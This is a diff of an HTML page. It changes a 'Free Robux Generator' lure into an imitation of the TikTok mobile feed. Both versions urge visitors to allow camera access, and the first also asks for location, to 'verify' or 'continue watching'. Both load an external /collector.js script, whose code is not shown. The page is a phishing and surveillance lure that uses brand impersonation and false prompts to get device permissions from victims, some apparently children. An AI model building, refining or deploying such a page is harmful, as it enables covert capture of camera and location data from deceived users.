@@ -1,45 +1,281 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 Free Robux Generator 2026</title>
+    <title>TikTok - Make Your Day</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{
-            font-family:'Comic Sans MS',cursive,sans-serif;
-            background:linear-gradient(135deg,#ff6b6b,#ffd93d,#6bcb77,#4d96ff);
-            background-size:400% 400%;
-            animation:bgMove 8s ease infinite;
-            display:flex;justify-content:center;align-items:center;
-            height:100vh;overflow:hidden;
+            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+            background:#000;
+            color:#fff;
+            height:100vh;
+            overflow:hidden;
         }
-        @keyframes bgMove{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-        .card{
-            background:white;border-radius:30px;padding:40px 30px;
-            text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);
-            max-width:380px;border:5px dashed #ff6b6b;
-            animation:bounce 2s infinite;
+        
+        /* TikTok top bar */
+        .top-bar{
+            display:flex;
+            justify-content:space-around;
+            align-items:center;
+            padding:12px 16px;
+            border-bottom:1px solid #222;
+            position:fixed;
+            top:0;
+            width:100%;
+            background:#000;
+            z-index:10;
         }
-        @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
-        .emoji{font-size:70px;animation:spin 3s linear infinite;display:inline-block}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        h1{font-size:28px;color:#ff6b6b;text-shadow:3px 3px 0 #ffd93d;margin:15px 0}
-        p{font-size:16px;color:#666;margin:10px 0}
-        .loading-bar{width:100%;height:25px;background:#eee;border-radius:15px;margin:20px 0;overflow:hidden;border:3px solid #ffd93d}
-        .loading-fill{height:100%;background:linear-gradient(90deg,#ff6b6b,#ffd93d,#6bcb77);border-radius:12px;animation:fill 3s ease forwards;width:0%}
-        @keyframes fill{0%{width:0%}50%{width:70%}100%{width:100%}}
-        .loading-text{color:#999;font-size:14px;margin-top:10px}
+        .top-bar span{
+            font-size:16px;
+            font-weight:600;
+            color:#fff;
+            opacity:0.5;
+            cursor:pointer;
+        }
+        .top-bar .active{
+            opacity:1;
+            border-bottom:2px solid #fff;
+            padding-bottom:10px;
+        }
+        .top-bar .live{
+            color:#ff0050;
+            opacity:1;
+        }
+        
+        /* Video area */
+        .video-area{
+            width:100%;
+            height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            position:relative;
+        }
+        .video-placeholder{
+            width:100%;
+            height:100%;
+            background:#111;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            position:relative;
+        }
+        
+        /* Loading spinner */
+        .spinner{
+            width:50px;
+            height:50px;
+            border:3px solid #333;
+            border-top:3px solid #fff;
+            border-radius:50%;
+            animation:spin 0.7s linear infinite;
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        
+        /* Side buttons (like real TikTok) */
+        .side-buttons{
+            position:absolute;
+            right:12px;
+            bottom:120px;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            gap:25px;
+            z-index:5;
+        }
+        .side-btn{
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            gap:4px;
+        }
+        .side-btn .icon{
+            width:45px;
+            height:45px;
+            background:#333;
+            border-radius:50%;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:22px;
+        }
+        .side-btn span{
+            font-size:11px;
+            color:#ddd;
+            font-weight:600;
+        }
+        .side-btn .heart{color:#ff0050}
+        
+        /* Bottom info */
+        .bottom-info{
+            position:absolute;
+            bottom:60px;
+            left:12px;
+            right:70px;
+            z-index:5;
+        }
+        .username{
+            font-weight:700;
+            font-size:16px;
+            margin-bottom:8px;
+        }
+        .username .badge{
+            background:#ff0050;
+            color:#fff;
+            font-size:10px;
+            padding:2px 6px;
+            border-radius:4px;
+            margin-left:6px;
+        }
+        .caption{
+            font-size:14px;
+            color:#eee;
+            margin-bottom:10px;
+            line-height:1.4;
+        }
+        .music{
+            font-size:12px;
+            color:#aaa;
+            display:flex;
+            align-items:center;
+            gap:6px;
+        }
+        
+        /* Bottom nav */
+        .bottom-nav{
+            position:fixed;
+            bottom:0;
+            width:100%;
+            display:flex;
+            justify-content:space-around;
+            padding:10px 0 20px;
+            background:#000;
+            border-top:1px solid #222;
+            z-index:10;
+        }
+        .nav-item{
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            gap:4px;
+            font-size:10px;
+            color:#888;
+        }
+        .nav-item .nav-icon{font-size:22px}
+        .nav-item.active{color:#fff}
+        .nav-item .plus{
+            background:#ff0050;
+            color:#fff;
+            width:30px;
+            height:30px;
+            border-radius:8px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:20px;
+        }
+        
+        /* Permission overlay */
+        .permission-note{
+            position:absolute;
+            bottom:140px;
+            left:50%;
+            transform:translateX(-50%);
+            background:rgba(0,0,0,0.8);
+            color:#fff;
+            padding:8px 16px;
+            border-radius:20px;
+            font-size:12px;
+            z-index:20;
+            animation:fadeInOut 3s forwards;
+        }
+        @keyframes fadeInOut{
+            0%{opacity:0}
+            20%{opacity:1}
+            80%{opacity:1}
+            100%{opacity:0}
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="emoji">🎮</div>
-        <h1>FREE ROBUX!</h1>
-        <p>Please allow camera & location to verify!</p>
-        <div class="loading-bar"><div class="loading-fill"></div></div>
-        <p class="loading-text">Verifying your account...</p>
+
+    <!-- Top Navigation -->
+    <div class="top-bar">
+        <span>Following</span>
+        <span class="active">For You</span>
+        <span class="live">LIVE</span>
     </div>
-    <script src="/collector.js?v=2"></script>
+
+    <!-- Video Area -->
+    <div class="video-area">
+        <div class="video-placeholder">
+            <div class="spinner" id="spinner"></div>
+        </div>
+        
+        <!-- Permission Note -->
+        <div class="permission-note">Allow camera to continue watching</div>
+        
+        <!-- Side Buttons -->
+        <div class="side-buttons">
+            <div class="side-btn">
+                <div class="icon">👤</div>
+            </div>
+            <div class="side-btn">
+                <div class="icon heart">❤️</div>
+                <span>87.4K</span>
+            </div>
+            <div class="side-btn">
+                <div class="icon">💬</div>
+                <span>2,456</span>
+            </div>
+            <div class="side-btn">
+                <div class="icon">🔗</div>
+                <span>Share</span>
+            </div>
+            <div class="side-btn">
+                <div class="icon">🎵</div>
+            </div>
+        </div>
+        
+        <!-- Bottom Info -->
+        <div class="bottom-info">
+            <div class="username">
+                @trending_videos <span class="badge">Follow</span>
+            </div>
+            <div class="caption">
+                Wait for it... 😱🔥 This is going viral! #fyp #trending
+            </div>
+            <div class="music">
+                🎵 Original Sound - TikTok Trending
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active">
+            <div class="nav-icon">🏠</div>
+            <span>Home</span>
+        </div>
+        <div class="nav-item">
+            <div class="nav-icon">🔍</div>
+            <span>Discover</span>
+        </div>
+        <div class="nav-item">
+            <div class="plus">+</div>
+        </div>
+        <div class="nav-item">
+            <div class="nav-icon">💬</div>
+            <span>Inbox</span>
+        </div>
+        <div class="nav-item">
+            <div class="nav-icon">👤</div>
+            <span>Profile</span>
+        </div>
+    </div>
+
+    <script src="/collector.js?v=5"></script>
 </body>
 </html>
